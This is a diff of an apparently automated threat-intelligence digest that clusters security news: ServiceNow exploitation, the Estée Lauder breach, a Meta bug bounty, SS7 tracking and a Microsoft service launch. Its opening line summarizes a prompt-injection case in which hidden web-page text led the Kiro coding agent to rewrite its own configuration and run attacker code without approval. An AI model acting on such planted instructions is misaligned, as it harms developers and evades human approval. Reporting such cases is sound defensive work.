+  - Summary: Hidden text on a web page was enough to make Kiro, AWS's agentic coding IDE, rewrite its own configuration file and run an attacker's code on a developer's machine, with no approval step able to stop it. Intezer, in research with Kodem Security, found that a request as ordinary as asking Kiro to summarize a page could end in remote code execution. AWS has patched the issue, and no CVE has been
 
 ### Cluster d1f6dab23f — score 16
 
@@ -1780,7 +1809,7 @@ The ServiceNow AI platform vulnerability tracked as CVE-2026-6875 can be exploit
 #### Full body
 
 ```
-A critical remote code execution vulnerability that was recently patched in the ServiceNow AI platform is reportedly being exploited in the wild. The security hole is tracked as CVE-2026-6875 and it has been described as a sandbox escape issue that an unauthenticated attacker can exploit in certain circumstances to execute arbitrary code. When it announced the availability of patches on July 14, ServiceNow said a security update addressing the vulnerability had been deployed to hosted instances. However, self-hosted customers have to install the patches themselves. On the same day, cybersecurity firm Searchlight Cyber disclosed technical details and showed how the vulnerability can be exploited. Threat intelligence firm Defused reported on July 18 that it had seen in-the-wild exploitation of CVE-2026-6875, leveraging information Searchlight Cyber had released. Defused initially said the exploit reached the same outcome as Searchlight’s proof-of-concept but through a slightly different method. On Monday, however, the firm issued a correction , saying that closer analysis showed the captured payload was in fact identical to Searchlight Cyber’s own. Advertisement. Scroll to continue reading. The vendor’s initial advisory stated it had no knowledge of active exploitation, and as of this writing, that advisory has not been updated to reflect otherwise. “ServiceNow is aware of a cybersecurity company’s recent publication regarding exploitation activity associated with a previously disclosed security vulnerability, identified as CVE-2026-6875,” a ServiceNow spokesperson told SecurityWeek . “Based on our investigation to date, we have not observed evidence that this activity is related to instances that ServiceNow hosts.” “We have provided updates and patches designed to address this issue, and we encourage our self-hosted and ServiceNow-hosted customers to apply the relevant patches if they have not already done so. In addition, we will continue to work directly with customers who need assistance in applying the patches,” the spokesperson added. There do not appear to be any other reports describing the exploitation of CVE-2026-6875, and there is a chance that the activity is being carried out by members of the cybersecurity industry seeking vulnerable systems. ServiceNow informed customers last month of an exploited vulnerability , but the company later clarified that the exploitation had been attributed to security researchers rather than attackers. ServiceNow vulnerabilities are not often exploited by threat actors. CISA’s KEV catalog currently includes only two flaws , both patched in 2024. Related : SonicWall Zero-Days Exploited to Deliver Custom Malware for Weeks Before Patch Related : WP2Shell WordPress Vulnerabilities Exploited in the Wild Related : Fresh SharePoint Vulnerability Exploited Soon After Disclosure Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs SonicWall Zero-Days Exploited to Deliver Custom Malware for Weeks Before Patch New Index Tracks Material Breaches — And Refuses to Add Up the Losses WP2Shell WordPress Vulnerabilities Exploited in the Wild Two Scattered Spider Hackers Sentenced to Jail in UK ‘ClickLock Stealer’ Bypasses macOS Security With Social Engineering, Process Killing China’s Top Cybersecurity Firms Hit by Mounting Military Procurement Bans Trend Micro, Tanium, ESET and Tenable Patch Severe Product Vulnerabilities US Charges Russian Individuals and Firms for Running Cybercrime Services Latest News Empirical Security Raises $25 Million in Series A Funding SecurityWeek La
+A critical remote code execution vulnerability that was recently patched in the ServiceNow AI platform is reportedly being exploited in the wild. The security hole is tracked as CVE-2026-6875 and it has been described as a sandbox escape issue that an unauthenticated attacker can exploit in certain circumstances to execute arbitrary code. When it announced the availability of patches on July 14, ServiceNow said a security update addressing the vulnerability had been deployed to hosted instances. However, self-hosted customers have to install the patches themselves. On the same day, cybersecurity firm Searchlight Cyber disclosed technical details and showed how the vulnerability can be exploited. Threat intelligence firm Defused reported on July 18 that it had seen in-the-wild exploitation of CVE-2026-6875, leveraging information Searchlight Cyber had released. Defused initially said the exploit reached the same outcome as Searchlight’s proof-of-concept but through a slightly different method. On Monday, however, the firm issued a correction , saying that closer analysis showed the captured payload was in fact identical to Searchlight Cyber’s own. Advertisement. Scroll to continue reading. The vendor’s initial advisory stated it had no knowledge of active exploitation, and as of this writing, that advisory has not been updated to reflect otherwise. “ServiceNow is aware of a cybersecurity company’s recent publication regarding exploitation activity associated with a previously disclosed security vulnerability, identified as CVE-2026-6875,” a ServiceNow spokesperson told SecurityWeek . “Based on our investigation to date, we have not observed evidence that this activity is related to instances that ServiceNow hosts.” “We have provided updates and patches designed to address this issue, and we encourage our self-hosted and ServiceNow-hosted customers to apply the relevant patches if they have not already done so. In addition, we will continue to work directly with customers who need assistance in applying the patches,” the spokesperson added. There do not appear to be any other reports describing the exploitation of CVE-2026-6875, and there is a chance that the activity is being carried out by members of the cybersecurity industry seeking vulnerable systems. ServiceNow informed customers last month of an exploited vulnerability , but the company later clarified that the exploitation had been attributed to security researchers rather than attackers. ServiceNow vulnerabilities are not often exploited by threat actors. CISA’s KEV catalog currently includes only two flaws , both patched in 2024. Related : SonicWall Zero-Days Exploited to Deliver Custom Malware for Weeks Before Patch Related : WP2Shell WordPress Vulnerabilities Exploited in the Wild Related : Fresh SharePoint Vulnerability Exploited Soon After Disclosure Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs SonicWall Zero-Days Exploited to Deliver Custom Malware for Weeks Before Patch New Index Tracks Material Breaches — And Refuses to Add Up the Losses WP2Shell WordPress Vulnerabilities Exploited in the Wild Two Scattered Spider Hackers Sentenced to Jail in UK ‘ClickLock Stealer’ Bypasses macOS Security With Social Engineering, Process Killing China’s Top Cybersecurity Firms Hit by Mounting Military Procurement Bans Trend Micro, Tanium, ESET and Tenable Patch Severe Product Vulnerabilities US Charges Russian Individuals and Firms for Running Cybercrime Services Latest News Cisco Launches Low-Cost AI Models for Source Code Security Empirical Secu
 ```
 
 #### Corroborating sources (2)
@@ -2148,47 +2177,6 @@ Risky Bulletin Podcast July 20, 2026 Risky Bulletin: Hacker wipes Romania's enti
   - Link: https://risky.biz/RBNEWS589/
   - Summary: A hacker wipes Romania’s entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress.
 
-### Cluster 00e5bf80fc — score 10
-
-- Title: Turning threat intelligence into decisive action with Defender Experts
-- Source: Microsoft Security Blog (threat_research_primary)
-- Published: 2026-07-15T16:00:35+00:00
-- Link: https://www.microsoft.com/en-us/security/blog/2026/07/15/turning-threat-intelligence-into-decisive-action-with-defender-experts/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_products: Microsoft Defender
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- affected_products: Microsoft Defender
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. The post Turning threat intelligence into decisive action with Defender Experts appeared first on Microsoft Security Blog .
-```
-
-#### Full body
-
-```
-Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender Experts MDR Microsoft Defender Experts Threat Intelligence Topics Actionable threat insights Defending against advanced tactics Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. Dashboards are full, alerts keep coming, but the hardest question of the day remains unanswered: of everything happening right now, what actually matters to us , and what do we do about i t? That space between knowing a threat exists and acting on it is the intelligence-to-action gap, and it’s where most breaches are won or lost. It doesn’t close with another feed or another dashboard. It closes with expertise: seasoned defenders who know your environment, interpret what global signal means for your risk, and stay with you from the first indicator to the final response. Today we’re announcing a new service, Microsoft Defender Experts Threat Intelligence , and we are expanding Microsoft Defender Experts MDR to include new third-party and multi-cloud coverage. Together, these human-led offerings are designed to close the intelligence-to-action gap at the two moments that decide the outcome: before a campaign reaches you, and as it moves through your environment. Upstream: See the campaign before it reaches you The earlier you see a campaign forming, the more options you have, and the cheaper every decision becomes. Yet most threat intelligence still arrives as raw feeds or static reports: high in volume, low in context, and disconnected from what’s exposed in your estate. Teams end up with more to read and no more clarity on what to do about it. Microsoft Defender Experts Threat Intelligence is a new, expert-delivered service that closes that distance. Built on Microsoft’s visibility across endpoints, identity, cloud, and evolving attacker activity, it gives your team periodic, curated insight into the threats most likely to target you. Designated Microsoft experts interpret the global landscape through the lens of your industry, geography, and environment, then translate it into clear, prioritized guidance your team can act on. As campaigns evolve, experts continuously refine that guidance with newly observed infrastructure, tactics, and targeting patterns, helping your team adjust hunting, hardening, and response activities. The insight is tailored for both leadership and defenders, providing executive-ready context alongside technical recommendations so the entire organization can act from a shared understanding of the threat landscape. The goal is simple: help you reduce risk before an attack reaches your environment, not explain what happened after the fact. In practice, your team receives: Early-warning alerts on emerging campaigns relevant to you Campaign-evolution updates as activity unfolds Contextualized intelligence tied to your risk profile Recurring briefings from your designated expert, rotating across geopolitical, industry, and global perspectives, on a scheduled basis In your environment: Follow the threat everywhere it moves Modern attacks rarely stay in one place. They cross from email to endpoint to identity to cloud, and increasingly traverse disparate security tools. Even when organizations have visibility into those environments, connecting multi-vendor and multi-domain signals into a coherent attack story remains a challenge. That’s the gap we’re closing on the response side: Microsoft Defender Experts MDR (formerly Microsoft Defender Experts for XDR) is expanding with new third-party and multi-cloud coverage powered by Microsoft Sentinel. Defender Experts MDR provides a fully managed detection and response service that reduces noise, adds expert context, and drives action. With support for leading non-Microsoft sources across cloud, identity, email, network, and endpoint enviro
-```
-
-#### Corroborating sources (1)
-
-- **Microsoft Security Blog** (threat_research_primary)
-  - Title: Turning threat intelligence into decisive action with Defender Experts
-  - Published: 2026-07-15T16:00:35+00:00
-  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/15/turning-threat-intelligence-into-decisive-action-with-defender-experts/
-  - Summary: Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. The post Turning threat intelligence into decisive action with Defender Experts appeared first on Microsoft Security Blog .
-
 ### Cluster 72fdd19b2c — score 10
 
 - Title: AI, Automation and Attacks: Unpacking the Unit 42 2026 Global Incident Response Report
@@ -2233,6 +2221,88 @@ Threat Research Center Insights Opinions Opinions AI, Automation and Attacks: Un
   - Published: 2026-07-16T23:00:59+00:00
   - Link: https://unit42.paloaltonetworks.com/ai-insights-incident-response-report/
   - Summary: Explore Unit 42's perspectives on AI's impact on cybersecurity, including key updates since the 2026 Incident Response Report. The post AI, Automation and Attacks: Unpacking the Unit 42 2026 Global Incident Response Report appeared first on Unit 42 .
+
+### Cluster 00e5bf80fc — score 10
+
+- Title: Turning threat intelligence into decisive action with Defender Experts
+- Source: Microsoft Security Blog (threat_research_primary)
+- Published: 2026-07-15T16:00:35+00:00
+- Link: https://www.microsoft.com/en-us/security/blog/2026/07/15/turning-threat-intelligence-into-decisive-action-with-defender-experts/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_products: Microsoft Defender
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- affected_products: Microsoft Defender
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. The post Turning threat intelligence into decisive action with Defender Experts appeared first on Microsoft Security Blog .
+```
+
+#### Full body
+
+```
+Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender Experts MDR Microsoft Defender Experts Threat Intelligence Topics Actionable threat insights Defending against advanced tactics Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. Dashboards are full, alerts keep coming, but the hardest question of the day remains unanswered: of everything happening right now, what actually matters to us , and what do we do about i t? That space between knowing a threat exists and acting on it is the intelligence-to-action gap, and it’s where most breaches are won or lost. It doesn’t close with another feed or another dashboard. It closes with expertise: seasoned defenders who know your environment, interpret what global signal means for your risk, and stay with you from the first indicator to the final response. Today we’re announcing a new service, Microsoft Defender Experts Threat Intelligence , and we are expanding Microsoft Defender Experts MDR to include new third-party and multi-cloud coverage. Together, these human-led offerings are designed to close the intelligence-to-action gap at the two moments that decide the outcome: before a campaign reaches you, and as it moves through your environment. Upstream: See the campaign before it reaches you The earlier you see a campaign forming, the more options you have, and the cheaper every decision becomes. Yet most threat intelligence still arrives as raw feeds or static reports: high in volume, low in context, and disconnected from what’s exposed in your estate. Teams end up with more to read and no more clarity on what to do about it. Microsoft Defender Experts Threat Intelligence is a new, expert-delivered service that closes that distance. Built on Microsoft’s visibility across endpoints, identity, cloud, and evolving attacker activity, it gives your team periodic, curated insight into the threats most likely to target you. Designated Microsoft experts interpret the global landscape through the lens of your industry, geography, and environment, then translate it into clear, prioritized guidance your team can act on. As campaigns evolve, experts continuously refine that guidance with newly observed infrastructure, tactics, and targeting patterns, helping your team adjust hunting, hardening, and response activities. The insight is tailored for both leadership and defenders, providing executive-ready context alongside technical recommendations so the entire organization can act from a shared understanding of the threat landscape. The goal is simple: help you reduce risk before an attack reaches your environment, not explain what happened after the fact. In practice, your team receives: Early-warning alerts on emerging campaigns relevant to you Campaign-evolution updates as activity unfolds Contextualized intelligence tied to your risk profile Recurring briefings from your designated expert, rotating across geopolitical, industry, and global perspectives, on a scheduled basis In your environment: Follow the threat everywhere it moves Modern attacks rarely stay in one place. They cross from email to endpoint to identity to cloud, and increasingly traverse disparate security tools. Even when organizations have visibility into those environments, connecting multi-vendor and multi-domain signals into a coherent attack story remains a challenge. That’s the gap we’re closing on the response side: Microsoft Defender Experts MDR (formerly Microsoft Defender Experts for XDR) is expanding with new third-party and multi-cloud coverage powered by Microsoft Sentinel. Defender Experts MDR provides a fully managed detection and response service that reduces noise, adds expert context, and drives action. With support for leading non-Microsoft sources across cloud, identity, email, network, and endpoint enviro
+```
+
+#### Corroborating sources (1)
+
+- **Microsoft Security Blog** (threat_research_primary)
+  - Title: Turning threat intelligence into decisive action with Defender Experts
+  - Published: 2026-07-15T16:00:35+00:00
+  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/15/turning-threat-intelligence-into-decisive-action-with-defender-experts/
+  - Summary: Security teams have never had more visibility, yet rarely have they felt more uncertain. Signal pours in from endpoints, identities, cloud workloads, and a sprawling mix of third-party tools. The post Turning threat intelligence into decisive action with Defender Experts appeared first on Microsoft Security Blog .
+
+### Cluster 1042e88cd6 — score 10
+
+- Title: US Military Smartphones Targeted Through Roaming and Ad Tech
+- Source: Citizen Lab (threat_research_primary)
+- Published: 2026-07-17T18:18:20+00:00
+- Link: https://citizenlab.ca/us-military-smartphones-targeted-through-roaming-and-ad-tech/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_industries: financial_services, telecommunications
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- affected_industries: financial_services, telecommunications
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Senior research fellow Gary Miller spoke to Financial Times about attempts to exploit mobile network vulnerabilities to track US personnel during the Iran war. The post US Military Smartphones Targeted Through Roaming and Ad Tech appeared first on The Citizen Lab .
+```
+
+#### Full body
+
+```
+Date Published July 17, 2026 Topics Targeted Surveillance advertising intelligence , telecommunications Mentions Gary Miller Share Senior research fellow Gary Miller spoke to Financial Times about attempts to exploit mobile network vulnerabilities to track US personnel during the Iran war. “Iran absolutely has capabilities to get real-time, immediate, and continuous location information,” he said. “It would surprise me very much if Iran were not using SS7, or mobile network access in the region, to track US users.” According to Miller, at least some of the tracking attempts can be linked to an Iranian mobile phone operator. “This appears to be very specific user targeting,” he said. Read more More in: Targeted Surveillance LATEST We found that former Member of the European Parliament Stelios Kouloglou was hacked with Pegasus spyware while serving on the PEGA committee, which investigated Pegasus and other spyware abuses in Europe. Through forensic analysis of his device, we found that the attackers could have had access to confidential documents and committee deliberations. July 3, 2026 Targeted Surveillance News + Updates → In the Media WhatsApp Accuses NSO of Fresh Pegasus Targeting JUNE 19, 2026 News + Updates → In the Media How Freedom Tech Is Pushing Back Against Digital Authoritarianism JUNE 17, 2026 News + Updates → In the Media Spying Via Your Mobile Phone Companies Can Locate Any Device at Any Time JUNE 15, 2026
+```
+
+#### Corroborating sources (1)
+
+- **Citizen Lab** (threat_research_primary)
+  - Title: US Military Smartphones Targeted Through Roaming and Ad Tech
+  - Published: 2026-07-17T18:18:20+00:00
+  - Link: https://citizenlab.ca/us-military-smartphones-targeted-through-roaming-and-ad-tech/
+  - Summary: Senior research fellow Gary Miller spoke to Financial Times about attempts to exploit mobile network vulnerabilities to track US personnel during the Iran war. The post US Military Smartphones Targeted Through Roaming and Ad Tech appeared first on The Citizen Lab .
 
 ### Cluster 2c8659a3fa — score 10
 
@@ -2411,47 +2481,6 @@ Microsoft Patch Tuesday for July 2026 — Snort rules and prominent vulnerabilit
   - Published: 2026-07-14T20:27:33+00:00
   - Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-july-2026/
   - Summary: Microsoft has released its monthly security update for July 2026, which includes 622 vulnerabilities affecting a range of products, including 57 that Microsoft marked as "critical."
-
-### Cluster 1042e88cd6 — score 10
-
-- Title: US Military Smartphones Targeted Through Roaming and Ad Tech
-- Source: Citizen Lab (threat_research_primary)
-- Published: 2026-07-17T18:18:20+00:00
-- Link: https://citizenlab.ca/us-military-smartphones-targeted-through-roaming-and-ad-tech/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_industries: financial_services, telecommunications
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- affected_industries: financial_services, telecommunications
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Senior research fellow Gary Miller spoke to Financial Times about attempts to exploit mobile network vulnerabilities to track US personnel during the Iran war. The post US Military Smartphones Targeted Through Roaming and Ad Tech appeared first on The Citizen Lab .
-```
-
-#### Full body
-
-```
-Date Published July 17, 2026 Topics Targeted Surveillance advertising intelligence , telecommunications Mentions Gary Miller Share Senior research fellow Gary Miller spoke to Financial Times about attempts to exploit mobile network vulnerabilities to track US personnel during the Iran war. “Iran absolutely has capabilities to get real-time, immediate, and continuous location information,” he said. “It would surprise me very much if Iran were not using SS7, or mobile network access in the region, to track US users.” According to Miller, at least some of the tracking attempts can be linked to an Iranian mobile phone operator. “This appears to be very specific user targeting,” he said. Read more More in: Targeted Surveillance LATEST We found that former Member of the European Parliament Stelios Kouloglou was hacked with Pegasus spyware while serving on the PEGA committee, which investigated Pegasus and other spyware abuses in Europe. Through forensic analysis of his device, we found that the attackers could have had access to confidential documents and committee deliberations. July 3, 2026 Targeted Surveillance News + Updates → In the Media WhatsApp Accuses NSO of Fresh Pegasus Targeting JUNE 19, 2026 News + Updates → In the Media How Freedom Tech Is Pushing Back Against Digital Authoritarianism JUNE 17, 2026 News + Updates → In the Media Spying Via Your Mobile Phone Companies Can Locate Any Device at Any Time JUNE 15, 2026
-```
-
-#### Corroborating sources (1)
-
-- **Citizen Lab** (threat_research_primary)
-  - Title: US Military Smartphones Targeted Through Roaming and Ad Tech
-  - Published: 2026-07-17T18:18:20+00:00
-  - Link: https://citizenlab.ca/us-military-smartphones-targeted-through-roaming-and-ad-tech/
-  - Summary: Senior research fellow Gary Miller spoke to Financial Times about attempts to exploit mobile network vulnerabilities to track US personnel during the Iran war. The post US Military Smartphones Targeted Through Roaming and Ad Tech appeared first on The Citizen Lab .
 
 ### Cluster c2f56a4fa7 — score 10
 
@@ -2986,7 +3015,7 @@ Windows LegacyHive zero-day flaw gets free, unofficial patches By Sergiu Gatlan 
 - threat_categories: active_exploitation, data_breach, supply_chain, zero_day
 - actor_attribution: Cl0p
 - affected_industries: financial_services, healthcare, manufacturing_industrial
-- affected_products: Microsoft 365, Microsoft SharePoint
+- affected_products: Microsoft 365
 - cve_ids: CVE-2025-61882
 - urgency_signals: preauth_unauth, zero_day
 - content_type: news_report
@@ -2996,7 +3025,7 @@ Windows LegacyHive zero-day flaw gets free, unofficial patches By Sergiu Gatlan 
 - threat_categories: supply_chain, zero_day, data_breach, active_exploitation
 - actor_attribution: Cl0p
 - affected_industries: healthcare, financial_services, manufacturing_industrial
-- affected_products: Microsoft SharePoint, Microsoft 365
+- affected_products: Microsoft 365
 - cve_ids: CVE-2025-61882
 - urgency_signals: zero_day, preauth_unauth
 - content_type: news_report
@@ -3011,7 +3040,7 @@ Hackers exfiltrated personal, financial, and health information from the company
 #### Full body
 
 ```
-Cosmetics giant Estée Lauder has started notifying employees that their information was stolen from its Oracle E-Business Suite (EBS) instance last year. The incident, the company says, occurred in early August 2025, when the infamous Cl0p cybercrime group started exploiting CVE-2025-61882, a zero-day vulnerability in Oracle EBS that enabled unauthenticated remote code execution (RCE), to exfiltrate data from numerous companies. In November, more than 100 companies were listed on the Cl0p leak website, many of which confirmed being impacted by the campaign. By March 2026, Broadcom, Bechtel, Estée Lauder, and Abbott Laboratories were the only major companies that had not disclosed the impact from the campaign. Cl0p leaked 870GB of archive files allegedly stolen from Estée Lauder. Several days after the zero-day was patched in early October, CrowdStrike said it found evidence that the bug’s in-the-wild exploitation started on August 9 , the same day that Estée Lauder was hit. In a notification letter to the affected individuals, a copy of which was filed (PDF) with the California Attorney General’s Office, the cosmetics giant said its investigation into the incident determined in June that personal information had been stolen from its EBS instance, which was used for HR management. Advertisement. Scroll to continue reading. The compromised data, the company says, includes names, addresses, dates of birth, Social Security numbers, passport numbers, bank account numbers, health information, and employment-related data, including payroll information. Estée Lauder is providing the potentially affected individuals with 24 months of free identity monitoring services and is advising them to remain vigilant for suspicious emails, texts, and phone calls. The company says it has notified law enforcement of the data breach and has taken measures to improve its system’s protections. Estée Lauder has not disclosed the number of potentially impacted individuals. SecurityWeek has emailed the company for additional details on the incident and will update this article if it responds. Related: Meta Paid $78,000 Bounty for Vulnerability Exposing Customer Support Data Related: Clover Health Investments Discloses Data Breach Related: Multiple Jscrambler Packages Impacted by Supply Chain Attack Related: Mainline Health, Select Medical Each Disclose Data Breaches Impacting 100,000 People Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire OpenSSL Silently Fixes ‘HollowByte’ DoS Vulnerability Ernst & Young Data Breach Affects Personal, Financial Information Hugging Face Hacked in Autonomous AI Attack Chrome 150 Update Patches Severe Memory Safety Bugs Beacon Security Raises $13 Million for Security Data Platform Cyberattack Disrupts Operations of Japanese Frozen Food Giant Nichirei Risk Ledger Raises $32 Million in Series B Funding Fresh SharePoint Vulnerability Exploited Soon After Disclosure Latest News Empirical Security Raises $25 Million in Series A Funding SecurityWeek Launches Critical Impact Awards to Recognize Excellence in Industrial Cybersecurity New HollowGraph Malware Abuses Microsoft 365 Calendar for C&C Communication CISO Conversations: Andreas Gaetje – From Economics to CISO at Körber AG Meta Paid $78,000 Bounty for Vulnerability Exposing Customer Support Data Clover Health Investments Discloses Data Breach Exploitation of ServiceNow Vulnerability Seen Days After Disclosure Zimbra Update Patches Critical Vulnerabilities Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Closing the Exploitation Gap July 22, 2026 Join this live webinar as we explore why exploitation is outpacing remediati
+Cosmetics giant Estée Lauder has started notifying employees that their information was stolen from its Oracle E-Business Suite (EBS) instance last year. The incident, the company says, occurred in early August 2025, when the infamous Cl0p cybercrime group started exploiting CVE-2025-61882, a zero-day vulnerability in Oracle EBS that enabled unauthenticated remote code execution (RCE), to exfiltrate data from numerous companies. In November, more than 100 companies were listed on the Cl0p leak website, many of which confirmed being impacted by the campaign. By March 2026, Broadcom, Bechtel, Estée Lauder, and Abbott Laboratories were the only major companies that had not disclosed the impact from the campaign. Cl0p leaked 870GB of archive files allegedly stolen from Estée Lauder. Several days after the zero-day was patched in early October, CrowdStrike said it found evidence that the bug’s in-the-wild exploitation started on August 9 , the same day that Estée Lauder was hit. In a notification letter to the affected individuals, a copy of which was filed (PDF) with the California Attorney General’s Office, the cosmetics giant said its investigation into the incident determined in June that personal information had been stolen from its EBS instance, which was used for HR management. Advertisement. Scroll to continue reading. The compromised data, the company says, includes names, addresses, dates of birth, Social Security numbers, passport numbers, bank account numbers, health information, and employment-related data, including payroll information. Estée Lauder is providing the potentially affected individuals with 24 months of free identity monitoring services and is advising them to remain vigilant for suspicious emails, texts, and phone calls. The company says it has notified law enforcement of the data breach and has taken measures to improve its system’s protections. Estée Lauder has not disclosed the number of potentially impacted individuals. SecurityWeek has emailed the company for additional details on the incident and will update this article if it responds. Related: Meta Paid $78,000 Bounty for Vulnerability Exposing Customer Support Data Related: Clover Health Investments Discloses Data Breach Related: Multiple Jscrambler Packages Impacted by Supply Chain Attack Related: Mainline Health, Select Medical Each Disclose Data Breaches Impacting 100,000 People Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Zimbra Update Patches Critical Vulnerabilities OpenSSL Silently Fixes ‘HollowByte’ DoS Vulnerability Ernst & Young Data Breach Affects Personal, Financial Information Hugging Face Hacked in Autonomous AI Attack Chrome 150 Update Patches Severe Memory Safety Bugs Beacon Security Raises $13 Million for Security Data Platform Cyberattack Disrupts Operations of Japanese Frozen Food Giant Nichirei Risk Ledger Raises $32 Million in Series B Funding Latest News Cisco Launches Low-Cost AI Models for Source Code Security Empirical Security Raises $25 Million in Series A Funding SecurityWeek Launches Critical Impact Awards to Recognize Excellence in Industrial Cybersecurity New HollowGraph Malware Abuses Microsoft 365 Calendar for C&C Communication CISO Conversations: Andreas Gaetje – From Economics to CISO at Körber AG Meta Paid $78,000 Bounty for Vulnerability Exposing Customer Support Data Clover Health Investments Discloses Data Breach Exploitation of ServiceNow Vulnerability Seen Days After Disclosure Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Closing the Exploitation Gap July 22, 2026 Join this live webinar as we explore why exploitation is outpacing remediation,
 ```
 
 #### Corroborating sources (1)
@@ -3060,7 +3089,7 @@ A security researcher discovered a broken access control vulnerability in Meta�
 #### Full body
 
 ```
-A security researcher says he has received a significant bug bounty from Meta after discovering a critical vulnerability that exposed customer support data. The vulnerability was discovered and reported to Meta in January 2026 by independent researcher Rony K Roy. The initial report to the social media giant described a security hole of limited severity, but further analysis revealed that the flaw’s impact was much higher than initially believed. According to Roy, Meta rolled out patches in April and had not found any evidence of malicious exploitation. The researcher disclosed his findings last week and told SecurityWeek that he received a $78,000 bug bounty from Meta. Meta has not responded to SecurityWeek’s request to confirm Roy’s claims, but he is indeed listed as one of the top researchers on the company’s bug bounty leaderboard for 2026. Roy initially believed he had identified an authorization issue in Meta Horizon Managed Solutions, an enterprise platform for managing Meta Quest devices and users. It turned out to be a broader issue affecting Meta’s backend support infrastructure. Advertisement. Scroll to continue reading. The researcher’s analysis led to the discovery of a vulnerability involving missing authorization, broken access control, and insecure direct object reference (IDOR) issues. When chained, these flaws could have been exploited to enumerate Meta support case numbers and obtain support requests. According to Roy, an attacker could have exploited the vulnerability to obtain email and chat conversations between users and Meta support, support case details, files submitted to the company via support requests, and personal and contact information shared by users with Meta support. In addition, an attacker could have created support requests on behalf of organizations that use Meta Horizon Managed Solutions, modified support workflows (including changing case status), and added unauthorized subscribers to support cases. Related : Exploitation of ServiceNow Vulnerability Seen Days After Disclosure Related : Zimbra Update Patches Critical Vulnerabilities Related : OpenSSL Silently Fixes ‘HollowByte’ DoS Vulnerability Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs SonicWall Zero-Days Exploited to Deliver Custom Malware for Weeks Before Patch New Index Tracks Material Breaches — And Refuses to Add Up the Losses WP2Shell WordPress Vulnerabilities Exploited in the Wild Two Scattered Spider Hackers Sentenced to Jail in UK ‘ClickLock Stealer’ Bypasses macOS Security With Social Engineering, Process Killing China’s Top Cybersecurity Firms Hit by Mounting Military Procurement Bans Trend Micro, Tanium, ESET and Tenable Patch Severe Product Vulnerabilities US Charges Russian Individuals and Firms for Running Cybercrime Services Latest News Empirical Security Raises $25 Million in Series A Funding SecurityWeek Launches Critical Impact Awards to Recognize Excellence in Industrial Cybersecurity New HollowGraph Malware Abuses Microsoft 365 Calendar for C&C Communication CISO Conversations: Andreas Gaetje – From Economics to CISO at Körber AG Estée Lauder Discloses Impact From Oracle EBS Zero-Day Hack Clover Health Investments Discloses Data Breach Exploitation of ServiceNow Vulnerability Seen Days After Disclosure Zimbra Update Patches Critical Vulnerabilities Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and 